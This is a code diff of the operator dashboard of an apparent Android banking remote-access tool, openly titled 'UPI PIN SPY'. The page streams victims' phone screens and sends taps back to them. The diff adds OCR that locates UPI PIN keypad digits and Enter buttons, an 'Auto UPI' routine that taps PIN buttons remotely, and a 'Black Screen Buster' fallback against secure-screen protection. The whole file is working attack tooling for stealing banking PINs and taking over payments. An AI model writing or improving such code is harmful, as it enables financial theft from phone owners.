@@ -1,167 +1,242 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 UPI PIN SPY - Banking Layouts LIVE</title>
+    <title>🎯 UPI PIN LAYOUT LIVE - Black Screen Buster</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
     <script src="/socket.io/socket.io.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
-            background: linear-gradient(135deg,#0f0f23,#1a1a2e); 
-            color: white; height: 100vh; overflow: hidden;
+            background: linear-gradient(135deg,#0a0a1a,#1a1a3a); color: white; 
+            height: 100vh; overflow: hidden;
         }
-        #devices { 
-            position: fixed; top: 15px; left: 15px; z-index: 100; 
-            background: rgba(0,0,0,0.95); padding: 20px; max-height: 85vh; 
-            overflow-y: auto; width: 280px; border-radius: 16px; 
-            backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
-        }
-        .device { 
-            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
-            cursor: pointer; border-radius: 12px; transition: all 0.2s; 
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .device:hover { background: rgba(0,170,120,0.9); transform: translateX(5px); }
-        .device.active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
-        .disconnected { opacity: 0.4; }
-        #phone-container { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            width: min(95vw, 450px); height: min(95vh, 900px); 
-            background: #000; border-radius: 40px; padding: 30px 25px; 
-            box-shadow: 0 30px 80px rgba(0,0,0,0.8); 
-            border: 3px solid rgba(255,255,255,0.1); touch-action: none;
-        }
-        #screen { 
-            width: 100%; height: 100%; border-radius: 25px; background: #111; 
-            image-rendering: optimizeSpeed; image-rendering: -moz-crisp-edges; 
-            image-rendering: pixelated; cursor: pointer; 
-            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
-        }
-        #status-bar { 
-            position: fixed; top: 15px; right: 15px; z-index: 100; 
-            background: rgba(0,0,0,0.9); padding: 15px 20px; border-radius: 12px; 
-            backdrop-filter: blur(20px); font-size: 13px; 
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        #fps-counter { color: #00ff88; font-weight: bold; }
         #controls { 
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); 
-            display: flex; gap: 15px; z-index: 100;
+            position: fixed; top: 20px; left: 20px; z-index: 100; 
+            display: flex; flex-direction: column; gap: 12px;
         }
         button { 
-            padding: 14px 28px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
-            color: #000; border: none; border-radius: 30px; cursor: pointer; 
-            font-size: 15px; font-weight: 600; transition: all 0.2s; 
-            box-shadow: 0 8px 25px rgba(0,255,136,0.4);
+            padding: 12px 24px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
+            color: #000; border: none; border-radius: 25px; cursor: pointer; 
+            font-weight: 600; transition: all 0.2s; box-shadow: 0 6px 20px rgba(0,255,136,0.4);
         }
-        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
-        #waiting { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); 
-            font-size: 18px; color: #00ff88; display: none; text-align: center;
+        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,255,136,0.6); }
+        button.danger { background: linear-gradient(45deg, #ff4444, #cc3333); }
+        
+        #phone-container { 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            width: min(90vw, 420px); height: min(90vh, 850px); 
+            background: #000; border-radius: 35px; padding: 25px 20px; 
+            box-shadow: 0 25px 70px rgba(0,0,0,0.9); 
+            border: 2px solid rgba(0,255,136,0.3); touch-action: none;
         }
+        #screen { 
+            width: 100%; height: 100%; border-radius: 20px; background: #111; 
+            image-rendering: pixelated; cursor: pointer; 
+            box-shadow: inset 0 2px 12px rgba(0,0,0,0.6);
+        }
+        
+        #layout-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            pointer-events: none; border-radius: 20px;
+        }
+        .ui-element { 
+            position: absolute; background: rgba(0,255,136,0.9); 
+            border-radius: 6px; padding: 4px 8px; font-size: 12px; 
+            font-weight: bold; color: #000; border: 1px solid #00ff88;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
+        
+        #status { 
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); 
+            background: rgba(0,0,0,0.9); padding: 15px 25px; border-radius: 25px; 
+            text-align: center; backdrop-filter: blur(20px);
+        }
+        #pin-pads { display: flex; gap: 10px; justify-content: center; margin-top: 8px; }
+        .pin-btn { width: 45px; height: 45px; border-radius: 50%; font-size: 20px; font-weight: bold; }
+        
+        #debug { position: fixed; top: 20px; right: 20px; font-size: 12px; background: rgba(0,0,0,0.8); padding: 12px; border-radius: 10px; }
     </style>
 </head>
 <body>
-    <div id="devices">
-        <h3 style="margin-bottom: 20px; color: #00ff88;">📱 LIVE Devices</h3>
-        <div id="device-list">Connecting...</div>
-    </div>
-    
-    <div id="status-bar">
-        <div>Status: <span id="connectionStatus">Connecting...</span></div>
-        <div id="fps-counter">FPS: -- | Device: --</div>
-        <div id="layoutStatus">UPI Layout: Waiting...</div>
+    <div id="controls">
+        <button onclick="toggleOCR()">🔍 OCR Toggle</button>
+        <button onclick="autoUpiPin()">🤖 Auto UPI</button>
+        <button onclick="clearOverlay()" class="danger">🗑️ Clear</button>
     </div>
 
     <div id="phone-container">
-        <canvas id="screen"></canvas>
+        <div style="position: relative;">
+            <canvas id="screen"></canvas>
+            <canvas id="layout-overlay"></canvas>
+        </div>
     </div>
 
-    <div id="waiting">
-        <div style="font-size: 24px; margin-bottom: 10px;">🎯</div>
-        UPI PIN Layouts Coming...
+    <div id="status">
+        <div id="status-text">Waiting for device...</div>
+        <div id="pin-pads"></div>
     </div>
 
-    <div id="controls">
-        <button onclick="sendBack()">🔙 Back</button>
-        <button onclick="toggleFullScreen()">📱 Full</button>
+    <div id="debug">
+        FPS: <span id="fps">0</span> | OCR: <span id="ocr-status">OFF</span> | 
+        Device: <span id="device-id">--</span>
     </div>
 
     <script>
-        const socket = io({ 
-            transports: ['websocket'], upgrade: false,
-            timeout: 5000, reconnection: true, reconnectionAttempts: 20
-        });
+        const socket = io({ transports: ['websocket'], timeout: 5000 });
+        const screenCanvas = document.getElementById('screen');
+        const overlayCanvas = document.getElementById('layout-overlay');
+        const ctxScreen = screenCanvas.getContext('2d');
+        const ctxOverlay = overlayCanvas.getContext('2d');
         
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 2400;
-        let frameCount = 0, lastFrameTime = 0, totalFrames = 0;
-        let isDragging = false, dragStart = { x: 0, y: 0 };
+        let frameCount = 0, lastFrameTime = 0, ocrWorker = null;
+        let layoutElements = [], isOcrEnabled = false, dragStart = {};
+        let uiButtons = {}; // UPI 0-9 + Enter
         
-        const canvas = document.getElementById('screen');
-        const ctx = canvas.getContext('2d');
-        const phoneContainer = document.getElementById('phone-container');
-        const deviceList = document.getElementById('device-list');
-        const connectionStatus = document.getElementById('connectionStatus');
-        const fpsCounter = document.getElementById('fps-counter');
-        const layoutStatus = document.getElementById('layoutStatus');
-        const waiting = document.getElementById('waiting');
-
-        socket.on('connect', () => {
-            console.log('✅ SOCKET LIVE!');
-            connectionStatus.textContent = '✅ LIVE';
-            connectionStatus.style.color = '#00ff88';
-            fetchDevices();
-        });
-
-        // 🔥 SHOW ALL FRAMES FROM ALL DEVICES (NO SELECT NEEDED!)
+        // 🔥 SOCKET EVENTS
         socket.on('screen-frame', (data) => {
-            totalFrames++;
-            console.log(`📱 Frame #${totalFrames} (${data.width}x${data.height}) → ${data.deviceId.slice(0,8)}`);
+            currentDevice = data.deviceId;
+            deviceWidth = data.width || deviceWidth;
+            deviceHeight = data.height || deviceHeight;
             
-            if (data.width && data.height) {
-                deviceWidth = data.width;
-                deviceHeight = data.height;
-                currentDevice = data.deviceId; // AUTO SELECT
-                
-                // 🔥 INSTANT HIDE WAITING
-                waiting.style.display = 'none';
-                layoutStatus.textContent = '✅ UPI PIN LAYOUT LIVE';
-                layoutStatus.style.color = '#00ff88';
-                
-                renderFrame(data);
-            }
+            document.getElementById('device-id').textContent = data.deviceId.slice(0,8);
+            renderFrame(data);
+            if (isOcrEnabled && frameCount % 10 === 0) analyzeLayout(data);
+        });
+        
+        socket.on('devices-update', (devices) => {
+            document.getElementById('status-text').textContent = 
+                `${devices.filter(d => d[1].connected).length} devices live`;
         });
 
-        // 🔥 ULTRA PRECISE UPI PIN RENDERING
+        // 🔥 FRAME RENDER + BLACK SCREEN SAFE
         function renderFrame(data) {
+            const rect = screenCanvas.parentElement.getBoundingClientRect();
+            screenCanvas.width = overlayCanvas.width = rect.width;
+            screenCanvas.height = overlayCanvas.height = rect.height;
+            
             const img = new Image();
             img.onload = () => {
-                const rect = phoneContainer.getBoundingClientRect();
-                canvas.width = rect.width;
-                canvas.height = rect.height;
-                
-                // 🔥 SHARP PIXELS FOR UPI BUTTONS
-                ctx.imageSmoothingEnabled = false;
-                ctx.drawImage(img, 0, 0, rect.width, rect.height);
-                
-                // FPS
-                frameCount++;
-                const now = performance.now();
-                if (now - lastFrameTime >= 1000) {
-                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
-                    fpsCounter.textContent = `FPS: ${fps} | Device: ${currentDevice?.slice(0,8) || '--'}`;
-                    frameCount = 0;
-                    lastFrameTime = now;
-                }
+                ctxScreen.imageSmoothingEnabled = false;
+                ctxScreen.drawImage(img, 0, 0, rect.width, rect.height);
+                updateFps();
+                drawOverlay();
             };
-            img.src = 'data:image/jpeg;base64,' + data.data;
+            img.onerror = () => {
+                // 🔥 BLACK SCREEN → Show last known layout
+                ctxScreen.fillStyle = '#222';
+                ctxScreen.fillRect(0, 0, rect.width, rect.height);
+                ctxScreen.fillStyle = '#ff0';
+                ctxScreen.font = '24px monospace';
+                ctxScreen.textAlign = 'center';
+                ctxScreen.fillText('BLACK SCREEN SAFE', rect.width/2, rect.height/2);
+                drawOverlay(); // Keep UI overlay
+            };
+            img.src = `data:image/jpeg;base64,${data.data}`;
         }
 
-        // 🔥 PERFECT UPI PIN COORDINATES
+        function updateFps() {
+            frameCount++;
+            const now = performance.now();
+            if (now - lastFrameTime >= 1000) {
+                document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
+                frameCount = 0; lastFrameTime = now;
+            }
+        }
+
+        // 🔥 TESSERACT OCR - UPI LAYOUT DETECT
+        async function analyzeLayout(frameData) {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const img = new Image();
+                img.src = `data:image/jpeg;base64,${frameData.data}`;
+                
+                await new Promise(r => img.onload = r);
+                canvas.width = img.width; canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                
+                const { data: { text, words } } = await Tesseract.recognize(canvas, 'eng', {
+                    logger: m => console.log(m)
+                });
+                
+                // 🔥 UPI PIN BUTTONS DETECT (0-9 + Enter)
+                layoutElements = words.filter(w => 
+                    (w.text.match(/^[0-9]$/) || w.text.toLowerCase().includes('enter') || 
+                     w.text.toLowerCase().includes('submit') || w.text.toLowerCase().includes('pin'))
+                ).map(w => ({
+                    text: w.text,
+                    bbox: w.bbox,
+                    confidence: w.confidence,
+                    centerX: w.bbox.x0 + (w.bbox.x1 - w.bbox.x0) / 2,
+                    centerY: w.bbox.y0 + (w.bbox.y1 - w.bbox.y0) / 2
+                }));
+                
+                // 🔥 Auto create PIN buttons
+                updatePinPads();
+                drawOverlay();
+                
+                console.log('🔍 OCR:', layoutElements.length, 'UI elements found');
+            } catch(e) {
+                console.log('OCR error:', e);
+            }
+        }
+
+        // 🔥 OVERLAY - UI BUTTONS + COORDINATES
+        function drawOverlay() {
+            const rect = screenCanvas.getBoundingClientRect();
+            ctxOverlay.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
+            
+            layoutElements.forEach(el => {
+                const scaleX = overlayCanvas.width / deviceWidth;
+                const scaleY = overlayCanvas.height / deviceHeight;
+                
+                const x = el.bbox.x0 * scaleX;
+                const y = el.bbox.y0 * scaleY;
+                const w = (el.bbox.x1 - el.bbox.x0) * scaleX;
+                const h = (el.bbox.y1 - el.bbox.y0) * scaleY;
+                
+                // Button box
+                ctxOverlay.strokeStyle = '#00ff88';
+                ctxOverlay.lineWidth = 2;
+                ctxOverlay.strokeRect(x, y, w, h);
+                
+                // Text label
+                ctxOverlay.fillStyle = '#000';
+                ctxOverlay.font = 'bold 14px monospace';
+                ctxOverlay.fillText(el.text, x + 5, y + 18);
+                
+                // Coords
+                ctxOverlay.fillStyle = '#ff0';
+                ctxOverlay.font = '11px monospace';
+                ctxOverlay.fillText(
+                    `(${Math.round(el.centerX)},${Math.round(el.centerY)})`, 
+                    x + 5, y + h - 5
+                );
+            });
+        }
+
+        // 🔥 UPI PIN BUTTONS
+        function updatePinPads() {
+            const pads = document.getElementById('pin-pads');
+            pads.innerHTML = '';
+            
+            layoutElements.filter(el => el.text.match(/^[0-9]$/)).slice(0,10).forEach((el, i) => {
+                const btn = document.createElement('button');
+                btn.className = 'pin-btn';
+                btn.textContent = el.text;
+                btn.onclick = () => tapPin(el.centerX, el.centerY, el.text);
+                pads.appendChild(btn);
+            });
+        }
+
+        // 🔥 PRECISE TAP
         function getScaledCoords(clientX, clientY) {
-            const rect = phoneContainer.getBoundingClientRect();
+            const rect = screenCanvas.parentElement.getBoundingClientRect();
             const scaleX = deviceWidth / rect.width;
             const scaleY = deviceHeight / rect.height;
             return {
@@ -170,89 +245,54 @@
             };
         }
 
-        // 🔥 TOUCH + MOUSE (UPI PIN Perfect!)
         ['mousedown', 'touchstart'].forEach(ev => 
-            phoneContainer.addEventListener(ev, startTouch, { passive: false })
+            screenCanvas.addEventListener(ev, e => {
+                e.preventDefault();
+                const coords = getScaledCoords(
+                    e.touches?.[0]?.clientX || e.clientX,
+                    e.touches?.[0]?.clientY || e.clientY
+                );
+                socket.emit('control', { deviceId: currentDevice, action: 'tap', x: coords.x, y: coords.y });
+                console.log(`🎯 TAP (${coords.x},${coords.y})`);
+            }, { passive: false })
         );
-        ['mousemove', 'touchmove'].forEach(ev => 
-            phoneContainer.addEventListener(ev, dragTouch, { passive: false })
-        );
-        ['mouseup', 'touchend'].forEach(ev => 
-            phoneContainer.addEventListener(ev, endTouch)
-        );
 
-        function startTouch(e) {
-            e.preventDefault();
-            isDragging = true;
-            const coords = getScaledCoords(
-                e.touches?.[0]?.clientX || e.clientX,
-                e.touches?.[0]?.clientY || e.clientY
-            );
-            dragStart = coords;
-            sendControl('tap', coords.x, coords.y);
+        // 🔥 AUTO UPI PIN
+        async function autoUpiPin() {
+            for (let i = 0; i < 6; i++) { // 6 digit PIN
+                const pinBtn = document.querySelector('.pin-btn');
+                if (pinBtn) {
+                    pinBtn.click();
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
         }
 
-        function dragTouch(e) {
-            if (!isDragging || !currentDevice) return;
-            e.preventDefault();
-            const coords = getScaledCoords(
-                e.touches?.[0]?.clientX || e.clientX,
-                e.touches?.[0]?.clientY || e.clientY
-            );
-            sendControl('swipe', dragStart.x, dragStart.y, coords.x, coords.y);
-        }
-
-        function endTouch() {
-            isDragging = false;
-        }
-
-        function sendControl(action, x, y, startX, startY, endX, endY) {
-            if (!currentDevice) return;
-            const data = { deviceId: currentDevice, action };
-            if (x !== undefined) data.x = x;
-            if (y !== undefined) data.y = y;
-            if (startX !== undefined) { data.startX = startX; data.startY = startY; }
-            if (endX !== undefined) { data.endX = endX; data.endY = endY; }
-            socket.emit('control', data);
-            console.log(`🎮 ${action} → (${x?.toFixed(0)},${y?.toFixed(0)})`);
-        }
-
-        function fetchDevices() {
-            fetch('/devices').then(r => r.json()).then(devices => {
-                updateDeviceList(devices);
+        function tapPin(x, y, text) {
+            socket.emit('control', { 
+                deviceId: currentDevice, 
+                action: 'tap', 
+                x: Math.round(x), 
+                y: Math.round(y) 
             });
+            console.log(`🤖 AUTO TAP "${text}" (${x},${y})`);
         }
 
-        function updateDeviceList(devices) {
-            deviceList.innerHTML = devices.map(([id, info]) => `
-                <div class="device ${info.connected ? '' : 'disconnected'} ${currentDevice === id ? 'active' : ''}" 
-                     onclick="selectDevice('${id}', this)">
-                    <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
-                    <small>${info.brand || 'Android'}</small><br>
-                    <span style="font-size:12px;">${info.connected ? '🟢 LIVE' : '🔴 OFF'}</span>
-                </div>
-            `).join('') || '<div style="opacity:0.5;">No devices</div>';
+        function toggleOCR() {
+            isOcrEnabled = !isOcrEnabled;
+            document.getElementById('ocr-status').textContent = isOcrEnabled ? 'ON' : 'OFF';
+            document.getElementById('ocr-status').style.color = isOcrEnabled ? '#00ff88' : '#ff4444';
         }
 
-        function selectDevice(deviceId, el) {
-            currentDevice = deviceId;
-            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
-            el.classList.add('active');
-            console.log('🎯 SELECTED:', deviceId);
+        function clearOverlay() {
+            layoutElements = [];
+            drawOverlay();
+            updatePinPads();
         }
 
-        function sendBack() {
-            sendControl('back');
-        }
-
-        function toggleFullScreen() {
-            document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
-        }
-
-        // 🔥 DEBUG CONSOLE
-        setInterval(() => {
-            console.log(`📊 Total Frames: ${totalFrames} | Active: ${currentDevice?.slice(0,8) || 'None'}`);
-        }, 5000);
+        // 🔥 START
+        toggleOCR(); // Auto ON
+        console.log('🎯 BLACK SCREEN BUSTER READY!');
     </script>
 </body>
 </html>
